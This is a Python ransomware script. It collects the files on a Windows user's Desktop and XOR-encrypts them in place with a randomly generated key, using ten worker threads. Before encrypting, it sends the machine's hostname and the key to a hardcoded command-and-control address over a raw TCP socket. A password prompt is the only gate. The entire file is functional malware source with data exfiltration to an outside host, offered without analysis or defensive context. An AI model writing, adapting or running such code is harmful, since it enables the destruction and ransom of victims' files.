import os
import socket
import random
import threading
import queue

# Safeguard
protect = input('Enter password to run the program : ')
if protect != 'Sandesh@123':
    quit()

# grab file paths to encrypt
print('preparing the files...')
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f'{desktop_path}\\{f}')
print('successfully located all files.')

# store files in the queue for thread to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)


# encryption info
encryption_level = 512 // 8  # 512 bits encryption
key_char_pool = 'abcdefghijklmnopqurstuvwxyzABCDEFGHIJKLMNOPQURSTUVWXYZ1234567890<>?/.,:{}[]|+='
key_char_pool_len = len(key_char_pool)

# generate encryption key
print('generating encryption key...')
key = ''
for i in range(encryption_level):
    key += key_char_pool[random.randint(0, key_char_pool_len - 1)]
print('key generated.')


def encrypt(key):
    while True:
        file = q.get()
        print(f'encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
            # increment key_index
            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
            print(f'{file} encrypted successfully.')
        except:
            print(f'{file} failed to encrypt.')
        q.task_done()


# grab client hostname
hostname = os.environ['COMPUTERNAME']

# socket info
IP_Address = '192.168.43.214'
PORT = 1234

# connecting to C2 server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_Address, PORT))
    print('successfully connected... transmitting hostname and key..')
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print('finished transmitting data.')

# set threads to get ready for encryption
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('encryption and upload complete.')
input()
